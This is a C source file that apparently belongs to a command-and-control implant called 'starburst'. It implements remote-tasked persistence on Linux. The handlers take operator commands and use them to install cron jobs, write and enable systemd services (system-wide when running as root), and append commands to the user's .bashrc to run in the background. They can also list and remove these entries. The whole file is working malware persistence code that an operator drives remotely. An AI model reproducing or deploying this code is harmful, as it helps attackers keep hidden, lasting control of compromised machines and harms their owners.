#include "starburst.h"

void cmd_persist_cron(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *schedule = pr_string(params);
    char *command = pr_string(params);

    if (strcmp(action, "install") == 0) {
        FILE *fp = popen("crontab -l 2>/dev/null", "r");
        size_t cap = 4096, len = 0;
        char *existing = (char *)malloc(cap);
        existing[0] = '\0';
        if (fp) {
            int n;
            while ((n = fread(existing + len, 1, cap - len - 1, fp)) > 0) {
                len += (size_t)n;
                if (len + 1024 > cap) { cap *= 2; existing = (char *)realloc(existing, cap); }
            }
            existing[len] = '\0';
            pclose(fp);
        }

        char new_entry[2048];
        snprintf(new_entry, sizeof(new_entry), "%s %s\n", schedule, command);

        fp = popen("crontab -", "w");
        if (!fp) {
            queue_response(task_uuid, RSP_ERROR, "popen(crontab) failed");
            free(existing); free(action); free(schedule); free(command);
            return;
        }
        if (len > 0) fwrite(existing, 1, len, fp);
        fwrite(new_entry, 1, strlen(new_entry), fp);
        pclose(fp);

        char msg[512];
        snprintf(msg, sizeof(msg), "cron installed: %s %s", schedule, command);
        queue_response(task_uuid, RSP_SUCCESS, msg);
        free(existing);
    } else if (strcmp(action, "list") == 0) {
        FILE *fp = popen("crontab -l 2>&1", "r");
        if (!fp) {
            queue_response(task_uuid, RSP_ERROR, "popen(crontab -l) failed");
        } else {
            size_t cap = 4096, len = 0;
            char *out = (char *)malloc(cap);
            int n;
            while ((n = fread(out + len, 1, cap - len - 1, fp)) > 0) {
                len += (size_t)n;
                if (len + 1024 > cap) { cap *= 2; out = (char *)realloc(out, cap); }
            }
            out[len] = '\0';
            pclose(fp);
            queue_response(task_uuid, RSP_SUCCESS, out);
            free(out);
        }
    } else if (strcmp(action, "remove") == 0) {
        system("crontab -r 2>/dev/null");
        queue_response(task_uuid, RSP_SUCCESS, "crontab removed");
    } else {
        queue_response(task_uuid, RSP_ERROR, "action: install, list, remove");
    }

    free(action); free(schedule); free(command);
}

void cmd_persist_systemd(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *name = pr_string(params);
    char *binary_path = pr_string(params);

    if (strcmp(action, "install") == 0) {
        uid_t euid = geteuid();
        char unit_path[512];

        if (euid == 0) {
            snprintf(unit_path, sizeof(unit_path), "/etc/systemd/system/%s.service", name);
        } else {
            char *home = getenv("HOME");
            if (!home) home = "/tmp";
            char dir[512];
            snprintf(dir, sizeof(dir), "%s/.config/systemd/user", home);
            char mkdir_cmd[600];
            snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p '%s'", dir);
            system(mkdir_cmd);
            snprintf(unit_path, sizeof(unit_path), "%s/%s.service", dir, name);
        }

        FILE *fp = fopen(unit_path, "w");
        if (!fp) {
            char err[256];
            snprintf(err, sizeof(err), "fopen(%s): %s", unit_path, strerror(errno));
            queue_response(task_uuid, RSP_ERROR, err);
            free(action); free(name); free(binary_path);
            return;
        }

        fprintf(fp,
            "[Unit]\n"
            "Description=%s\n"
            "After=network.target\n\n"
            "[Service]\n"
            "Type=simple\n"
            "ExecStart=%s\n"
            "Restart=on-failure\n"
            "RestartSec=30\n\n"
            "[Install]\n"
            "WantedBy=%s\n",
            name, binary_path,
            euid == 0 ? "multi-user.target" : "default.target");
        fclose(fp);

        char enable_cmd[600];
        if (euid == 0) {
            snprintf(enable_cmd, sizeof(enable_cmd), "systemctl daemon-reload && systemctl enable --now %s.service 2>&1", name);
        } else {
            snprintf(enable_cmd, sizeof(enable_cmd), "systemctl --user daemon-reload && systemctl --user enable --now %s.service 2>&1", name);
        }

        FILE *efp = popen(enable_cmd, "r");
        char out[512] = "";
        if (efp) { fread(out, 1, sizeof(out) - 1, efp); pclose(efp); }

        char msg[1024];
        snprintf(msg, sizeof(msg), "systemd service installed: %s\nunit: %s\n%s", name, unit_path, out);
        queue_response(task_uuid, RSP_SUCCESS, msg);
    } else if (strcmp(action, "remove") == 0) {
        uid_t euid = geteuid();
        char cmd[600];
        if (euid == 0) {
            snprintf(cmd, sizeof(cmd), "systemctl disable --now %s.service 2>&1 && rm -f /etc/systemd/system/%s.service", name, name);
        } else {
            snprintf(cmd, sizeof(cmd), "systemctl --user disable --now %s.service 2>&1", name);
        }
        FILE *fp = popen(cmd, "r");
        char out[512] = "";
        if (fp) { fread(out, 1, sizeof(out) - 1, fp); pclose(fp); }
        queue_response(task_uuid, RSP_SUCCESS, out[0] ? out : "service removed");
    } else if (strcmp(action, "list") == 0) {
        uid_t euid = geteuid();
        const char *list_cmd = euid == 0
            ? "systemctl list-units --type=service --no-pager 2>&1"
            : "systemctl --user list-units --type=service --no-pager 2>&1";
        FILE *fp = popen(list_cmd, "r");
        size_t cap = 8192, len = 0;
        char *out = (char *)malloc(cap);
        if (fp) {
            int n;
            while ((n = fread(out + len, 1, cap - len - 1, fp)) > 0) {
                len += (size_t)n;
                if (len + 1024 > cap) { cap *= 2; out = (char *)realloc(out, cap); }
            }
            out[len] = '\0';
            pclose(fp);
        }
        queue_response(task_uuid, RSP_SUCCESS, out);
        free(out);
    } else {
        queue_response(task_uuid, RSP_ERROR, "action: install, remove, list");
    }

    free(action); free(name); free(binary_path);
}

void cmd_persist_bashrc(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *command = pr_string(params);

    char *home = getenv("HOME");
    if (!home) home = "/root";

    const char *rc_files[] = { ".bashrc", ".profile", ".bash_profile", NULL };

    if (strcmp(action, "install") == 0) {
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", home, rc_files[0]);

        FILE *fp = fopen(path, "a");
        if (!fp) {
            char err[256];
            snprintf(err, sizeof(err), "fopen(%s): %s", path, strerror(errno));
            queue_response(task_uuid, RSP_ERROR, err);
            free(action); free(command);
            return;
        }
        fprintf(fp, "\n%s &\n", command);
        fclose(fp);

        char msg[512];
        snprintf(msg, sizeof(msg), "appended to %s: %s", path, command);
        queue_response(task_uuid, RSP_SUCCESS, msg);
    } else if (strcmp(action, "list") == 0) {
        size_t cap = 8192, len = 0;
        char *out = (char *)malloc(cap);
        out[0] = '\0';

        for (int i = 0; rc_files[i]; i++) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", home, rc_files[i]);
            FILE *fp = fopen(path, "r");
            if (fp) {
                int hdr = snprintf(out + len, cap - len, "=== %s ===\n", path);
                len += (size_t)hdr;
                int n;
                while ((n = fread(out + len, 1, cap - len - 1, fp)) > 0) {
                    len += (size_t)n;
                    if (len + 1024 > cap) { cap *= 2; out = (char *)realloc(out, cap); }
                }
                fclose(fp);
                out[len++] = '\n';
            }
        }
        out[len] = '\0';
        queue_response(task_uuid, RSP_SUCCESS, out);
        free(out);
    } else {
        queue_response(task_uuid, RSP_ERROR, "action: install, list");
    }

    free(action); free(command);
}
